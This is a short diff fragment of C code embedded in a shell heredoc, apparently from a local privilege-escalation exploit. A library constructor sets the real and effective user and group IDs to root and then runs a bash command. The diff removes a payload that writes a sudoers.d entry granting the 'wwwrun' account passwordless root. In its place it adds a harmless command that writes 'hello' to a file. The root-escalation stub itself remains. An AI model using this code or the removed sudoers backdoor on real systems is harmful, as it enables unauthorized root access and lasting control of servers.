@@ -13,9 +13,7 @@ __attribute__((constructor)) void woot(void) {
   setreuid(0,0);
   setregid(0,0);
   chdir("/");
-  execl("/bin/bash", "/bin/bash", "-c",
-      "printf '%s\\n' 'wwwrun ALL=(ALL:ALL) NOPASSWD: ALL' > /etc/sudoers.d/wwwrun && chmod 0440 /etc/sudoers.d/wwwrun",
-      (char *)NULL);
+  execl("/bin/bash", "/bin/bash", "-c", "echo hello > /home/kupibileti/hello.txt", (char *)NULL);
 }
 EOF
 
